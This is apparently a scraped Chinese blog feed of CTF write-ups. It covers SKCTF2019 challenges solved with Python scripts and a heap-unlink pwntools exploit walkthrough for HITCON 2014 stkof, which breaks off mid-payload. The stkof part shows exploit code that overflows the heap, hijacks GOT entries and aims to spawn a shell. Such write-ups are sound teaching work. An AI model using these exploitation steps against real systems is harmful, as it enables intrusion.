    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/d1b6e358252dd42a091baa05083b5bb5c8eab8af.jpg" alt></p><a id="more"></a><hr><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=29572363&auto=1&height=66"></iframe>**前段时间参加了SKCTF2019,并且最近推完了《三色绘恋》, 作为纪念, 这篇博文的所有配图都用《三色绘恋》里面的CG了~ 可爱的墨小菊作封面镇博~ **<p><strong>这篇博文会持续更新,直到我把我会做的所有题都更一篇WP为止</strong></p><h1 id="AWD部分"><a href="#AWD部分" class="headerlink" title="AWD部分"></a>AWD部分</h1><ul><li>我没什么AWD经验, 登入服务器什么的还是现学的, 下载下来pwn以后也只是粗略分析… 忽视了一个大漏洞,导致pwn一直被打而没有进攻…</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190530073132.png" alt></p><ul><li><p>我与进攻只差一个666。</p></li><li><p>首先pwn的login是一个点, 这个通过被攻击流量直接拿到了打法。</p></li></ul><blockquote><p>用户名直接a上200个, 密码a上72个。</p></blockquote><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190530073614.png" alt></p><ul><li><p>但是这个流量里面含有太多攻击者的测试阶段, 这对第一次进行AWD流量分析的我产生了干扰。。。 再加上我不太会pwn,我以为要执行完所有攻击者的行为才能cat flag。</p></li><li><p>但是运行过程中一直在调试… 忽略了最简单的666,起初还纳闷这个666是干什么的,直到赛后表哥讲解的时候才恍然大悟… 这心情感觉就像高考试卷没写名字一样…。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190530073808.png" alt></p><p><strong>先暂时记录到这, 因为还没开始正式学pwn, 先从逆向学起~</strong></p><h1 id="MISC部分"><a href="#MISC部分" class="headerlink" title="MISC部分"></a>MISC部分</h1><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/12.jpg" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/QQ%E6%88%AA%E5%9B%BE20190529223624.png" alt></p><h2 id="0x01-unzip"><a href="#0x01-unzip" class="headerlink" title="0x01 unzip"></a>0x01 unzip</h2><ul><li>考察时间戳, 可以直接爆破压缩包密码。</li></ul><blockquote><p>时间戳是指格林威治时间1970年01月01日00时00分00秒(北京时间1970年01月01日08时00分00秒)起至现在的总秒数。</p></blockquote><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190530125752.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190530130023.png" alt></p><ul><li><p>可以直接从1550000000 开始爆破密码, 这样省时间。</p></li><li><p>解开zip 得到flag。</p></li></ul><h2 id="0x02-二维码"><a href="#0x02-二维码" class="headerlink" title="0x02 二维码"></a>0x02 二维码</h2><ul><li><p>考察PIL库的运用, 编码与加解密。</p></li><li><p>题目是给了一堆RGB值, 把它保存在一个文件里。 脚本附上。</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">280</span></span><br><span class="line">y = <span class="number">280</span></span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">"RGB"</span>, (x, y))</span><br><span class="line">file = open(<span class="string">"D:\\RGB.txt"</span>,<span class="string">'r'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, y):</span><br><span class="line">        line = file.readline().replace(<span class="string">'('</span>,<span class="string">''</span>).replace(<span class="string">')'</span>,<span class="string">''</span>) </span><br><span class="line">        rgb = line.split(<span class="string">","</span>)</span><br><span class="line">        im.putpixel((i, j), (int(rgb[<span class="number">0</span>]), int(rgb[<span class="number">1</span>]), int(rgb[<span class="number">2</span>])))</span><br><span class="line"></span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure><ul><li>得到二维码</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE20190525093450.png" alt></p><ul><li>扫码得到:</li></ul><blockquote><p>ONYXE6LSIVXF6ZTUOZTXWRRRIRPWCZLWORIGCLJQG56Q====</p></blockquote><ul><li>base32解码得到:</li></ul><blockquote><p>sqryrEn_ftvg{F1D_aevtPa-07}</p></blockquote><ul><li>9栏栅栏解密得到:</li></ul><blockquote><p>synt{DeP0qr_vF_va7rEfg1at-}</p></blockquote><ul><li>凯撒解密得到:</li></ul><blockquote><p>flag{QrC0de_iS_in7eRst1ng-}</p></blockquote><h2 id="0x03-猜数"><a href="#0x03-猜数" class="headerlink" title="0x03 猜数"></a>0x03 猜数</h2><ul><li><p>考察写脚本能力或者说…耐心…</p></li><li><p>这道题我是试了手撕了一百多次,得到了150个数据,然后得到了flag.</p></li><li><p>这150个数据就不列出来了.</p></li><li><p>这里学习大佬的利用pwntools的解法。</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">t = [<span class="string">'679'</span>]<span class="comment">#这个表示初始数据, 根据题目来的,因为第一个数需要输入679才对。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0xff</span>):<span class="comment">#这里是设置需要循环的次数, 可根据需要调整, 这道题目150就够了。</span></span><br><span class="line">	p = remote(<span class="string">'10.1.0.18'</span>,<span class="number">10000</span>)</span><br><span class="line">	<span class="keyword">for</span> c <span class="keyword">in</span> t:</span><br><span class="line">		p.sendline(str(c))</span><br><span class="line">	p.sendline(<span class="string">'a'</span>)<span class="comment">#发送一个注定不合法的字符, 然后接收程序返回的正确数据。</span></span><br><span class="line">	time.sleep(<span class="number">0.1</span>)<span class="comment">#间隔0.1秒来防止由于网络问题出现的错误</span></span><br><span class="line">	t.append(p.recv().split(<span class="string">'Good!\n'</span>)[<span class="number">-1</span>].replace(<span class="string">'\n'</span>,<span class="string">''</span>))<span class="comment">#接收并添加数据进入列表t</span></span><br><span class="line">	p.close()</span><br><span class="line">	<span class="comment">#print t #这一步可以不要。</span></span><br></pre></td></tr></table></figure><ul><li>这样的话, 如果数据和题目提供的数据完全相同的话, flag也就会跟着输出出来了。</li></ul><h2 id="0x04-Manchester"><a href="#0x04-Manchester" class="headerlink" title="0x04 Manchester"></a>0x04 Manchester</h2><ul><li><p>考察图片隐写与曼彻斯特编码。</p></li><li><p>在kali里面binwalk题目图片,发现里面还隐藏着一张图片, foremost分离出来以后是一堆类似于-. 这种。</p></li><li><p>还没做完,等平台重新开放再更。</p></li></ul><h1 id="Crypto部分"><a href="#Crypto部分" class="headerlink" title="Crypto部分"></a>Crypto部分</h1><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/QQ%E6%88%AA%E5%9B%BE20190529223433.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/QQ%E6%88%AA%E5%9B%BE20190529223453.png" alt></p><h2 id="0x01-签到题"><a href="#0x01-签到题" class="headerlink" title="0x01 签到题"></a>0x01 签到题</h2><ul><li>考察手速和仔细程度</li><li>公告真该仔细看看。</li></ul><h2 id="0x02-RSA"><a href="#0x02-RSA" class="headerlink" title="0x02 RSA"></a>0x02 RSA</h2><ul><li><p>考察对RSA算法的理解与应用。</p></li><li><p>之前见过的题目大都是已知pqe或ne推出d之类的,而这个题目是已知ned去反推pq。</p></li><li><p>尝试对模n进行在线分解,但是无果, n实在太大了。</p></li><li><p>又尝试进行正向爆破,看看谁(p)乘谁(q)等于模n,但是…n实在太大了, 数据都超出范围了…</p></li><li><p>无奈只能上网找算法。</p></li><li><p>脚本附上:</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">   <span class="keyword">if</span> a &lt; b:</span><br><span class="line">     a, b = b, a</span><br><span class="line">   <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">     temp = a % b</span><br><span class="line">     a = b</span><br><span class="line">     b = temp</span><br><span class="line">   <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpq</span><span class="params">(n,e,d)</span>:</span></span><br><span class="line">    p = <span class="number">1</span></span><br><span class="line">    q = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> p==<span class="number">1</span> <span class="keyword">and</span> q==<span class="number">1</span>:</span><br><span class="line">        k = d * e - <span class="number">1</span></span><br><span class="line">        g = random.randint ( <span class="number">0</span> , n )</span><br><span class="line">        <span class="keyword">while</span> p==<span class="number">1</span> <span class="keyword">and</span> q==<span class="number">1</span> <span class="keyword">and</span> k % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            k /= <span class="number">2</span></span><br><span class="line">            y = pow(g,k,n)</span><br><span class="line">            <span class="keyword">if</span> y!=<span class="number">1</span> <span class="keyword">and</span> gcd(y<span class="number">-1</span>,n)&gt;<span class="number">1</span>:</span><br><span class="line">                p = gcd(y<span class="number">-1</span>,n)</span><br><span class="line">                q = n/p</span><br><span class="line">    <span class="keyword">return</span> p,q</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    n =<span class="number">16352578963372306131642407541567045533766691177138375676491913897592458965544068296813122740126583082006556217616296009516413202833698268845634497478988128850373221853516973259086845725813424850548682503827191121548693288763243619033224322698075987667531863213468223654181658012754897588147027437229269098246969811226129883327598021859724836993626315476699384610680857047403431430525708390695622848315322636785398223207468754197643541958599210127261345770914514670199047435085714403641469016212958361993969304545214061560160267760786482163373784437641808292654489343487613446165542988382687729593384887516272690654309</span></span><br><span class="line">    e =<span class="number">65537</span></span><br><span class="line">    d =<span class="number">9459928379973667430138068528059438139092368625339079253289560577985304435062213121398231875832264894458314629575455553485752685643743266654630829957442008775259776311585654014858165341757547284112061885158006881475740553532826576260839430343960738520822367975528644329172668877696208741007648370045520535298040161675407779239300466681615493892692265542290255408673533853011662134953869432632554008235340864803377610352438146264524770710345273439724107080190182918285547426166561803716644089414078389475072103315432638197578186106576626728869020366214077455194554930725576023274922741115941214789600089166754476449453</span></span><br><span class="line"></span><br><span class="line">    p,q = getpq(n,e,d)</span><br><span class="line">    <span class="keyword">print</span> p</span><br><span class="line">    <span class="keyword">print</span> q</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><ul><li>由此可以得到pq,然后代入题目给的脚本。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> md5 <span class="keyword">import</span> md5</span><br><span class="line">p = <span class="number">121681461613856685891389697655082707982324934394003375745821514797619569583750841725694490585739982440237839675155146102668334623474524757328414864963814738071946391260695792366762521733527504377788503669628114869921159658618293030663730923781347146576731525405173348568491361155907470541865888995846800200299</span></span><br><span class="line"></span><br><span class="line">q =<span class="number">134388416661738455437155072073325006890713121761597606147089758733385481112565493304597414841403553334452751594251761452974840757858360219741735123120957682353146947112071576479841838875008748813717254467137424822946053401492632307085887983816096569782409349352398269269865393361999329194582827715646840442991</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = p*q</span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> n, e, d</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Flag: SKCTF&#123;%s&#125;"</span> %md5(str(p + q)).hexdigest()</span><br></pre></td></tr></table></figure><ul><li>运行得到flag:</li></ul><blockquote><p>SKCTF{e7ddad281ff7dfc99eb3379e0efd46f8}</p></blockquote><h2 id="0x03-xor"><a href="#0x03-xor" class="headerlink" title="0x03 xor"></a>0x03 xor</h2><ul><li>题目是这么一堆字符…</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rJeekZuQkZjfqpGWiZqNjJaLht+Qmd+snJaakZya356Rm9+rmpyXkZCTkJiG9b6bm42ajIzFysjG366WnpGInpGYnpGY362QnpvT37eKnpGYm56Q37uWjIuNlpyL09+ulpGYm56Q09+sl56Rm5CRmN+vjZCJlpGcmtPfzcnJysbP09+v0a3RvJeWkZ71rLS8q7mEzpvJnsnLm8rGzc/Nyp7LzcbNmp2Zy5mZxpyZxsvOzsuC</span><br></pre></td></tr></table></figure><ul><li><p>比赛的时候对着这么一串字符与0~256都异或了一遍, 然并卵。</p></li><li><p>殊不知需要先对这一串字符进行base64解密。。。。</p></li><li><p>脚本附上:</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s = <span class="string">'rJeekZuQkZjfqpGWiZqNjJaLht+Qmd+snJaakZya356Rm9+rmpyXkZCTkJiG9b6bm42ajIzFysjG366WnpGInpGYnpGY362QnpvT37eKnpGYm56Q37uWjIuNlpyL09+ulpGYm56Q09+sl56Rm5CRmN+vjZCJlpGcmtPfzcnJysbP09+v0a3RvJeWkZ71rLS8q7mEzpvJnsnLm8rGzc/Nyp7LzcbNmp2Zy5mZxpyZxsvOzsuC'</span></span><br><span class="line">str = base64.b64decode(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xff</span>+<span class="number">1</span>):</span><br><span class="line">    ss = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> str:</span><br><span class="line">        ss+=chr(ord(x)^i)</span><br><span class="line">    <span class="keyword">print</span> ss</span><br></pre></td></tr></table></figure><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190530222305.png" alt></p><ul><li>运行结果挺有意思的…</li><li>flag:</li></ul><blockquote><p>SKCTF{1d6a64d592025a4292ebf4ff9cf94114}</p></blockquote><h2 id="0x04-抓捕贪污犯"><a href="#0x04-抓捕贪污犯" class="headerlink" title="0x04 抓捕贪污犯"></a>0x04 抓捕贪污犯</h2><ul><li><p>考察仿射密码</p></li><li><p>题目没记下来…等平台再开的时候再更…</p></li><li><p>基本思路就是先通过题目的提示 写个小算法得到a与b, 然后对题目中那一串字符串进行仿射解密。</p></li></ul><h1 id="Reverse-部分"><a href="#Reverse-部分" class="headerlink" title="Reverse 部分"></a>Reverse 部分</h1><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/QQ%E6%88%AA%E5%9B%BE20190529223941.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/QQ%E6%88%AA%E5%9B%BE20190529223929.png" alt></p><h2 id="0x01-CUBE"><a href="#0x01-CUBE" class="headerlink" title="0x01 CUBE"></a>0x01 CUBE</h2><ul><li><p>考察angr的运用。</p></li><li><p>之前曾经接触过一些angr方面的题目, 但是与之前题目不同的是,这道题的avoid的地方有多个,谷歌到需要使用元组来进行avoid。</p></li><li><p>但是比赛的时候并没有完整地解出来这道题目。因为考虑的方向有所偏差,陷入一片迷茫。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/@ONP51JXGN37ARC$NLOK@1M.png" alt></p><ul><li><p>比赛时我的find地址选的0x401015,这样导致无法执行到下面0x4010C1的printf后门。 哭,再一次辜负了表哥的期望… awd里的pwn也是因为后门。。。逆向也是因为后门。。。</p></li><li><p>如果是执行我所选用的find地址,执行结果为:</p></li></ul><blockquote><p>0000263700000026370000002637000000263700000026370000002637000000263700000026370000000000000000000000000000000000000000000000263700000026370000002637000000263700</p></blockquote><ul><li><p>但是鉴于C语言里面 00002637与2637等值, 尽管程序可以通过执行并且输入十来个数进行check,如果对就返回flag。 但angr的执行结果返回了这么一堆带0的东西,而且没有分隔,这导致我不知道这十来个数到底是00002637还是2637或是26370之类的具体哪种或者哪几种。</p></li><li><p>赛后复现题目的时候表哥给了个思路, find的地址直接取到后门的printf位置,这样便能直接输出flag!</p></li><li><p>提供两个脚本,分别是windows版本的和Linux版本的。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Windows</span></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">avoid = [<span class="number">0x40095B</span>,<span class="number">0x400A98</span>,<span class="number">0x400B16</span>,<span class="number">0x400E6E</span>,<span class="number">0x400EC2</span>,<span class="number">0x400F70</span>,<span class="number">0x401001</span>]</span><br><span class="line">proj = angr.Project(<span class="string">'D:\\CUBE'</span>,auto_load_libs = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line"></span><br><span class="line">simgr = proj.factory.simulation_manager(state)</span><br><span class="line"></span><br><span class="line">simgr.explore(find = <span class="number">0x4010C1</span>,avoid = avoid)</span><br><span class="line"></span><br><span class="line"><span class="comment">#simgr.found[0].posix.dumps(0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></li></ul><hr><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Linux</span></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">avoid = [<span class="number">0x40095B</span>,<span class="number">0x400A98</span>,<span class="number">0x400B16</span>,<span class="number">0x400E6E</span>,<span class="number">0x400EC2</span>,<span class="number">0x400F70</span>,<span class="number">0x401001</span>]</span><br><span class="line">proj = angr.Project(<span class="string">'./CUBE'</span>,auto_load_libs = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line"></span><br><span class="line">simgr = proj.factory.simulation_manager(state)</span><br><span class="line"></span><br><span class="line">simgr.explore(find = <span class="number">0x4010C1</span>,avoid = avoid)</span><br><span class="line"></span><br><span class="line">simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><ul><li>运行得到flag:</li></ul><blockquote><p>skctf{2637002637000263700-26370026370002637002637002637000263700-2637002637000263700}</p></blockquote><h2 id="0x02-Fibonacci"><a href="#0x02-Fibonacci" class="headerlink" title="0x02 Fibonacci"></a>0x02 Fibonacci</h2><ul><li>IDA载入 来到main函数位置查看伪代码。<br><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190530223448.png" alt></li></ul><ul><li>提供两个方法。</li></ul><h3 id="方法一-算法逆向"><a href="#方法一-算法逆向" class="headerlink" title="方法一 算法逆向"></a>方法一 算法逆向</h3><ul><li>既然是Fibonacci,也就是斐波那契数列, 那么查看check函数。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190530233107.png" alt></p><ul><li><p>函数中 dword_60ACC0与 dword_60ACC4是我们输入的两个数。</p></li><li><p>dword_601080则是存放着斐波那契数列的一个数组。</p></li><li><p>根据这个函数, 它遍历了从斐波那契数列第一个数到第五十个数,如果满足我们输入的两个数是斐波那契数列中相邻的两个数并且它们之和为75025,则成功输出flag。</p></li><li><p>那么我们只需要先写出来一个长度为50的斐波那契数列,脚本如下:</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line">L = [<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">    x = L[i]+L[i+<span class="number">1</span>]</span><br><span class="line">    L.append(x)</span><br><span class="line"><span class="keyword">print</span> L</span><br></pre></td></tr></table></figure><ul><li>结合斐波那契数列的性质, 我们输入的两个数相加一定会是斐波那契数列中的另一个数,并且在我们输入的这俩数中较大的一个数的后面。</li><li>在输出的L里查找得到28657,46368,75025这一串,所以28657,46368即为答案。</li><li>所以flag为:</li></ul><blockquote><p>SKCTF{2865746368}</p></blockquote><h3 id="方法二-angr"><a href="#方法二-angr" class="headerlink" title="方法二 angr"></a>方法二 angr</h3><ul><li><p>由第一个CUBE题产生了灵感,直接angr。</p></li><li><p>直接上脚本了, Windows的脚本。</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">'D:\\Fibonacci'</span>,auto_load_libs = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line"></span><br><span class="line">simgr = proj.factory.simulation_manager(state)</span><br><span class="line"></span><br><span class="line">simgr.explore(find = <span class="number">0x4008C4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><ul><li>直接输出:</li></ul><blockquote><p>The flag is SKCTF{2865746368}</p></blockquote><h1 id="Pwn-部分"><a href="#Pwn-部分" class="headerlink" title="Pwn 部分"></a>Pwn 部分</h1><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/QQ%E6%88%AA%E5%9B%BE20190529223829.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/QQ%E6%88%AA%E5%9B%BE20190529223848.png" alt></p><ul><li>但愿我能在这一部分更上一篇… 能力有限,还是先以逆向为主…</li></ul>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>[Unlink] 2014-HITCON-stkof </title>
    <url>/2020/02/03/Unlink-2014-HITCON-stkof/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/1319944831152.png" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><ul><li><p>本例为<code>CTF-WIKI</code>上面用来练习<code>Unlink</code>的例题。</p></li><li><p>题目下载链接:<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof" target="_blank" rel="noopener">下载链接</a></p></li><li><p>参考链接:</p></li></ul><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/" target="_blank" rel="noopener">CTF-WIKI</a></p><p><a href="https://www.jianshu.com/p/b47fa01ec791" target="_blank" rel="noopener">简书</a></p><h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><blockquote><ol><li>alloc：输入 size，分配 size 大小的内存，并在 bss 段记录对应 chunk 的指针，假设其为 head</li><li>read：根据指定索引，向分配的内存处读入数据，数据长度可控，这里存在堆溢出的情况</li><li>free：根据指定索引，释放已经分配的内存块</li><li>????：这个功能没啥用</li></ol></blockquote><ul><li>在<code>2. read</code>函数里面存在漏洞, 由于程序采用如下读取输入的方式,并不会对读取长度进行限制,故会造成堆溢出。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = fread(ptr, <span class="number">1u</span>LL, n, <span class="built_in">stdin</span>); i &gt; <span class="number">0</span>; i = fread(ptr, <span class="number">1u</span>LL, n, <span class="built_in">stdin</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  ptr += i;</span><br><span class="line">  n -= i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>这里存在一个有趣的现象:</li></ul><blockquote><p>值得注意的是，由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。这里经过测试，会申请两个缓冲区，分别大小为 1024 和 1024。</p></blockquote><ul><li><p>所以我们可以在前面先分配一个 chunk 来把缓冲区分配完毕，以免影响之后的操作。</p></li><li><p>还有一点值得注意: 注意看<code>1. alloc函数</code>。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200203153426.png" alt></p><ul><li>这里采用的<code>::s[++dword_602100] = v2;</code>，也就是说，第一个chunk指针是存在s[1]的位置的。</li></ul><h1 id="0x02-思路"><a href="#0x02-思路" class="headerlink" title="0x02 思路"></a>0x02 思路</h1><ul><li>通过<code>unlink</code>漏洞,修改<code>free@got</code>为<code>puts@plt</code>,想办法输出<code>puts</code>函数的真实地址，计算<code>libcbase</code>，从而得到<code>system地址</code>.修改<code>atoi@got</code>为<code>system</code>, 输入/bin/sh的地址, 执行<code>system(&#39;/bin/sh&#39;)</code>获得shell。</li></ul><h1 id="0x03-Let’s-do-it！"><a href="#0x03-Let’s-do-it！" class="headerlink" title="0x03 Let’s do it！"></a>0x03 Let’s do it！</h1><h2 id="前期模板"><a href="#前期模板" class="headerlink" title="前期模板"></a>前期模板</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = process(<span class="string">'./stkof'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./stkof'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">head = <span class="number">0x602140</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    c.sendline(<span class="string">'1'</span>)</span><br><span class="line">    c.sendline(str(size))</span><br><span class="line">    c.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,cont)</span>:</span></span><br><span class="line">    c.sendline(<span class="string">'2'</span>)</span><br><span class="line">    c.sendline(str(idx))</span><br><span class="line">    c.sendline(str(len(cont)))</span><br><span class="line">    c.send(cont)</span><br><span class="line">    c.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c.sendline(<span class="string">'3'</span>)</span><br><span class="line">    c.sendline(str(idx))</span><br></pre></td></tr></table></figure><ul><li><p>这里注意一下<code>edit</code>函数,由于程序读入字符串的方式比较特殊，这里选取<code>c.send(cont)</code>。</p></li><li><p>具体来讲就是,这个程序虽然不会对输入的字符串长度进行限制，但是这种读入方法不同于<code>gets</code>，<code>gets</code>读到换行符就会结束，但是这个程序读到换行符会把换行符也当做一种输入，然后继续等待接下来的输入，这显然不符合我们的需求。而<code>sendline</code>在末尾会有换行符，所以我们采用末尾不带有换行符而是相当于带有<code>\x00</code>的<code>send</code>。</p></li></ul><h2 id="申请内存"><a href="#申请内存" class="headerlink" title="申请内存"></a>申请内存</h2><ul><li><p>前面的分析里已经讲到，需要申请先申请一个chunk把缓冲区分配掉。</p></li><li><p>其次还要注意他们的下标，下标是从1开始的。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x100</span>) <span class="comment">#1</span></span><br><span class="line">alloc(<span class="number">0x30</span>)  <span class="comment">#2</span></span><br><span class="line">alloc(<span class="number">0x80</span>)  <span class="comment">#3</span></span><br></pre></td></tr></table></figure></li><li><p>分配好以后，来看一下我们的<code>head</code>，也就是<code>IDA里面显示的s</code>，这也证明了下标是从1开始。</p></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x602140</span><br><span class="line">0x602140:	0x0000000000000000	0x0000000001921020</span><br><span class="line">0x602150:	0x0000000001921540	0x0000000001921580</span><br></pre></td></tr></table></figure><h2 id="伪造chunk"><a href="#伪造chunk" class="headerlink" title="伪造chunk"></a>伪造chunk</h2><ul><li><p>由于<code>unlink</code>能够实现<code>*target = target-0x18</code>(下面会在例子中讲)</p></li><li><p>我们选取<code>target = head + 16</code>，也就是 <code>head[2]</code>的地址。因为接下来我们是需要通过<code>free掉chunk2的nextchunk</code>，也就是<code>free(head[3])</code>来触发<code>unlink</code>，而<code>unlink</code>的验证则要求<code>fd-&gt;bk == P &amp;&amp; bk-&gt;fd == P</code>。</p></li></ul><ul><li>上面如果看着有点晕， 那么简单地说就是需要<code>target = 我们伪造的chunk所在的chunk的地址</code>。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">target = head + <span class="number">16</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">8</span>         <span class="comment">#padding</span></span><br><span class="line">payload += p64(<span class="number">0x31</span>)    <span class="comment">#size</span></span><br><span class="line">payload += p64(fd)  <span class="comment">#fd = target - 0x18</span></span><br><span class="line">payload += p64(bk)  <span class="comment">#bk = target - 